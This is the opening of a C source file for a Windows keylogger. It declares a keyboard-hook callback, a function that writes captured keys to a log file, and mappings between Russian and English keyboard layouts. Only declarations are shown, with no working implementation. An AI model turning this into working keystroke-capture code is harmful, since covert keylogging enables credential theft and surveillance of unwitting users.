#include<Windows.h>
#include<stdio.h>
#define PATH L"C:\\Users\\ТрифоноваАР\\source\\repos\\Hook\\KeyLog.txt"
#define RUS 1049
#define ENG 1033

BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wPARAM, LPARAM LParam);
VOID WriteToFile(LPWSTR wstr);
WCHAR EnToRus(char c);